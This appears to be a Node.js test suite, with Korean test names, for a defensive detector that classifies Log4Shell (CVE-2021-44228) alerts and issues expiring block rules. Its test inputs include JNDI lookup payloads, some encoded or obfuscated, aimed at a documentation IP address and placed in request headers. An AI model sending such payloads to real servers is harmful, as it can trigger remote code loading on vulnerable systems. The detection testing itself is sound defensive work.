import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { replay } from '../scripts/xdr-replay.mjs';
import * as bruteForceModule from '../xdr/brute-force/respond.mjs';
import { decide } from '../xdr/known-cve/decide.mjs';
import { readAlerts } from '../xdr/known-cve/read-alerts.mjs';
import * as knownCveModule from '../xdr/known-cve/respond.mjs';
import * as webModule from '../xdr/web-injection/respond.mjs';
import { isDeniedAddress } from '../xdr/ztna-overlay.mjs';

const fixturePath = new URL('../xdr/fixtures/known-cve.json', import.meta.url);
const fixture = JSON.parse(await readFile(fixturePath, 'utf8'));
const readJson = async name => JSON.parse(await readFile(new URL(`../xdr/fixtures/${name}.json`, import.meta.url), 'utf8'));
const decideSource = await readFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');
const num = id => Number(id.slice(3));
const expectedFor = id => (num(id) <= 8 ? 'block' : num(id) <= 16 ? 'alert' : 'record');
// 문서용 구문입니다. 시험에서도 문자열로만 다루고 어디로도 보내지 않습니다.
const LOOKUP_TEXT = '${jndi:ldap://198.51.100.9/x}';
const make = (description, level, data) => ({
  id: 'v-1', timestamp: '2026-10-12T00:00:00Z', rule: { level, mitre: ['T1190'], description },
  data: { srcip: '203.0.113.200', ...data },
});

test('경보 읽기 모듈은 건수가 같고 머리글·주소 원문(조회 구문)을 내보내지 않는다', () => {
  const rows = readAlerts(fixturePath);
  assert.equal(rows.length, fixture.alerts.length);
  for (const row of rows) assert.deepEqual(Object.keys(row).sort(), ['account', 'at', 'description', 'id', 'level', 'srcip']);
  assert.ok(!JSON.stringify(rows).includes('jndi:'));
});

test('명확한 공격은 block, 애매한 시도는 alert, 정상 이벤트는 record로 나뉜다', () => {
  for (const alert of fixture.alerts) {
    const out = decide(alert);
    assert.equal(out.action, expectedFor(alert.id), `${alert.id}: ${out.reason}`);
    assert.ok(Number.isFinite(out.confidence) && out.confidence >= 0 && out.confidence <= 1);
    assert.equal(out.action, out.confidence >= 0.85 ? 'block' : out.confidence >= 0.5 ? 'alert' : 'record');
  }
});

test('모든 reason에 근거 패턴 이름이 한 줄로 있고 요청 원문·조회 구문이 없다', async () => {
  const patterns = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
  for (const alert of fixture.alerts) {
    const { reason } = decide(alert);
    assert.ok(patterns.patterns.some(pattern => reason.includes(pattern.id)), `${alert.id}: ${reason}`);
    assert.ok(!reason.includes('\n') && reason.length <= 220, alert.id);
    assert.ok(!/jndi:|ldap:|\$\{/iu.test(reason), `${alert.id}: 이유에 조회 구문 원문이 있다`);
    for (const value of Object.values(alert.data)) {
      if (typeof value === 'string' && value.length > 6) assert.ok(!reason.includes(value), `${alert.id}: 이유에 요청 값 원문이 있다`);
    }
  }
});

test('경보 번호·주소·순서를 바꿔도 같은 판단이 나온다(정답 고정 없음)', () => {
  fixture.alerts.forEach((alert, i) => {
    const moved = { ...alert, id: `zz-${i}`, data: { ...alert.data, srcip: `198.18.2.${i + 1}` } };
    assert.equal(decide(moved).action, decide(alert).action, alert.id);
  });
});

test('CVE 번호·jndi 단어·중괄호·점검 도구 이름 하나만으로는 막지 않는다', () => {
  assert.notEqual(decide(make('CVE-2021-44228 형태 요청입니다.', 13, { url: '/search?q=CVE-2021-44228' })).action, 'block');
  assert.notEqual(decide(make('수업 노트에 jndi 라는 단어가 있습니다.', 12, { url: '/notes?q=jndi-class-note', count: '30' })).action, 'block');
  assert.notEqual(decide(make('머리글에 중괄호가 있습니다.', 12, { useragent: '{class}', count: '9' })).action, 'block');
  assert.notEqual(decide(make('점검 도구와 비슷한 수업용 프로그램 이름이 있습니다.', 12, { url: '/tools/class-check' })).action, 'block');
  assert.notEqual(decide(make('원격 조회 구문은 없습니다.', 12, { url: '/search?q=${jndi:' })).action, 'block'); // 잘린 구문
  assert.equal(decide(make('공개 화면을 열었습니다.', 3, { url: '/' })).action, 'record');
});

test('인코딩·쪼갠 변형과 다른 머리글에 있는 완전한 조회 구문도 막고, 수준이 낮으면 알림만 남긴다', () => {
  const encoded = encodeURIComponent(LOOKUP_TEXT);
  assert.equal(decide(make('요청입니다.', 12, { url: `/search?q=${encoded}` })).action, 'block');
  assert.equal(decide(make('요청입니다.', 12, { url: `/search?q=${encodeURIComponent(encoded)}` })).action, 'block');
  assert.equal(decide(make('요청입니다.', 12, { useragent: '${${lower:j}ndi:ldap://198.51.100.9/x}' })).action, 'block');
  assert.equal(decide(make('요청입니다.', 12, { referer: '${${::-j}${::-n}${::-d}${::-i}:ldap://198.51.100.9/x}' })).action, 'block');
  assert.equal(decide(make('요청입니다.', 12, { 'x-api-version': LOOKUP_TEXT })).action, 'block');
  // 수준 10 미만이면 구조가 있어도 알림
  assert.equal(decide(make('요청입니다.', 8, { url: `/search?q=${encoded}` })).action, 'alert');
  // 출발 주소 칸에 들어 있는 값은 요청 근거로 보지 않는다
  assert.notEqual(decide(make('요청입니다.', 12, { srcip: LOOKUP_TEXT })).action, 'block');
  // 아주 긴 값·깨진 인코딩도 오류 없이 처리
  assert.ok(['alert', 'record', 'block'].includes(decide(make('요청입니다.', 12, { url: `/x?q=%E0%A4%A${'A'.repeat(10000)}` })).action));
});

test('제출용 decide.mjs는 import 없이 파일 하나로 독립 실행되고 결과가 같다', async () => {
  const code = decideSource.split('\n').filter(line => !line.trim().startsWith('//')).join('\n');
  assert.doesNotMatch(code, /^\s*import\b|\bimport\(|\brequire\(|\bfetch\(|\bprocess\b|\bDate\b|readFile|writeFile|XMLHttpRequest|WebSocket|\beval\(|new Function/mu);
  const standalone = await import(`data:text/javascript;base64,${Buffer.from(decideSource).toString('base64')}`);
  for (const alert of fixture.alerts) assert.deepEqual(await standalone.decide(alert), decide(alert));
});

test('패턴 목록은 근거가 한 줄씩 있고 decide.mjs 상수에 이름·조건·근거가 그대로 있다', async () => {
  const patterns = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
  assert.match(patterns.source, /CVE-2021-44228/u);
  assert.match(patterns.source, /T1190/u);
  assert.ok(patterns.patterns.length >= 2);
  for (const pattern of patterns.patterns) {
    assert.ok(typeof pattern.evidence === 'string' && pattern.evidence.trim().length > 10 && !pattern.evidence.includes('\n'), pattern.id);
    assert.match(pattern.technique, /^T1(190|595\.002)$/u);
    for (const field of ['name', 'condition', 'evidence']) assert.ok(decideSource.includes(pattern[field]), `${pattern.id}.${field}`);
    assert.ok(decideSource.includes(`"${pattern.id}"`), pattern.id);
  }
});

test('형식이 이상한 입력은 오류 없이 record로 남는다', () => {
  for (const bad of [null, undefined, 'x', 7, [], {}, { rule: null, data: 'x' }, { rule: { level: 'high', description: 5 }, data: { url: 42, useragent: {}, count: 'abc' } }]) {
    const out = decide(bad);
    assert.equal(out.action, 'record');
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
  }
});

test('차단 후보는 block만, 15분 만료·근거 번호가 있고 다른 모듈 규칙·알림 중복을 보존한다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'kc-'));
  try {
    const rulesPath = join(dir, 'deny-rules.json');
    const logPath = join(dir, 'alerts.log');
    await bruteForceModule.respond((await readJson('brute-force')).alerts, { rulesPath, logPath });
    await webModule.respond((await readJson('web-injection')).alerts, { rulesPath, logPath });
    const result = await knownCveModule.respond(fixture.alerts, { rulesPath, logPath });
    assert.deepEqual(result.counts, { block: 8, alert: 8, record: 8 });
    assert.equal(result.rules.length, 8);
    for (const rule of result.rules) {
      assert.equal(expectedFor(rule.evidenceAlertId), 'block');
      assert.equal(rule.moduleKey, 'known-cve');
      assert.equal(Date.parse(rule.expiresAt) - Date.parse(rule.issuedAt), 15 * 60 * 1000);
      assert.ok(!/jndi:|ldap|\$\{/iu.test(JSON.stringify(rule)), '규칙에 조회 구문 원문이 없다');
    }
    const saved = JSON.parse(await readFile(rulesPath, 'utf8'));
    assert.equal(saved.rules.filter(r => r.moduleKey === 'brute-force').length, 10, 'XDR-01 규칙 보존');
    assert.equal(saved.rules.filter(r => r.moduleKey === 'web-injection').length, 8, 'XDR-02 규칙 보존');
    assert.equal(saved.rules.length, 26);

    const log = (await readFile(logPath, 'utf8')).trim().split('\n').filter(line => line.includes(' | known-cve | '));
    assert.equal(log.length, 16);
    assert.ok(!log.some(line => /user\d+|jndi:|ldap|\$\{|\/search|\/login/u.test(line)), '알림 로그에 계정·요청 원문이 없다');
    assert.equal((await knownCveModule.respond(fixture.alerts, { rulesPath, logPath })).logLinesAdded, 0);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('세 모듈 모의 재생: 공격 26건만 막히고 겹친 주소는 마지막 규칙이 끝나야 풀린다', async () => {
  const result = await replay([
    { module: bruteForceModule, alerts: (await readJson('brute-force')).alerts },
    { module: webModule, alerts: (await readJson('web-injection')).alerts },
    { module: knownCveModule, alerts: fixture.alerts },
  ]);
  assert.deepEqual(
    { attackDenied: result.attackDenied, attackTotal: result.attackTotal, normalDenied: result.normalDenied, ambiguousDenied: result.ambiguousDenied, expiredDenied: result.expiredDenied },
    { attackDenied: 26, attackTotal: 26, normalDenied: 0, ambiguousDenied: 0, expiredDenied: 0 },
  );
  assert.ok(result.sharedAddresses.includes('203.0.113.10'));
  assert.deepEqual(result.byModule['known-cve'], { rules: 8, attackDenied: 8, attackTotal: 8, normalDenied: 0, ambiguousDenied: 0 });
  const rules = [
    ...(await bruteForceModule.respond((await readJson('brute-force')).alerts)).rules,
    ...(await webModule.respond((await readJson('web-injection')).alerts)).rules,
    ...(await knownCveModule.respond(fixture.alerts)).rules,
  ];
  const shared = rules.filter(rule => rule.sourceIp === '203.0.113.10');
  assert.ok(new Set(shared.map(rule => rule.moduleKey)).size === 3, '세 모듈이 같은 주소를 막는다');
  const expiries = shared.map(rule => rule.expiresAt).sort();
  assert.equal(isDeniedAddress(rules, '203.0.113.10', expiries[0]), true, '먼저 끝난 규칙 뒤에도 다른 규칙이 유효하면 거부');
  assert.equal(isDeniedAddress(rules, '203.0.113.10', expiries.at(-1)), false, '마지막 규칙이 끝나면 풀림');
});
